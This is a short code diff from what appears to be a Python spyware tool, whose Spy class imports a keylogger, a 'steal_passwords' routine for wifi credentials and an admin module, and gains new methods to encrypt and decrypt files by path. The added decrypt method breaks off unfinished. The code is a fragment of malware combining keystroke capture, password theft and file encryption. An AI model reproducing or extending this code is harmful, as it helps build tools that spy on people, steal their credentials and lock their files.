@@ -1,5 +1,5 @@
 import os
-from typing import Optional
+from typing import Optional, Tuple
 from KeyLogger import KeyLogger
 from Wifi import steal_passwords
 import admin
@@ -115,7 +115,14 @@ class Spy:
         self.encryptor = Encryptor()
         return self.encryptor.encryption_key
 
-    def encrypt(self):
+    def encrypt(self, path: str) -> Tuple[list, list]:
+        return self.encryptor.encrypt(path)
+
+    def decrypt(self, path: str, key=None) -> Tuple[list, list]:
+        if not key:
+            return self.encryptor.decrypt(path)
+        e = Encryptor(key)
+
 
 
 
